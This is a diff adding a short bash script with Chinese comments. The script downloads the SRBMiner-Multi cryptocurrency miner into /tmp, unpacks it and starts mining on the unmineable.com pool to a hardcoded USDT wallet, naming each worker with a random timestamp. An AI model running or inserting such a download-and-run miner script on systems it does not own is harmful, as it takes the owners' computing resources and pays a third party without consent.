@@ -1,0 +1,23 @@
+#!/bin/bash
+cd /tmp && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.0.3/SRBMiner-Multi-3-0-3-Linux.tar.gz && tar -xzvf SRBMiner-Multi-3-0-3-Linux.tar.gz && cd SRBMiner-Multi-3-0-3
+
+# 创建快捷启动脚本
+cat <<'EOF' > start
+#!/bin/bash
+
+# 生成随机矿工名
+WORKER_NAME="worker_$(date +%s)_$RANDOM"
+
+# 创建并启动一个新的 screen 会话，执行挖矿程序
+./SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet USDT:TGpiKru64ovzRMeBVTNgDDC5fakbDVU9Qk.${WORKER_NAME}#pblk-utjn
+# 输出通知
+
+EOF
+
+# 设置执行权限
+chmod +x start
+
+# 启动脚本
+./start
+
+# 完成通知
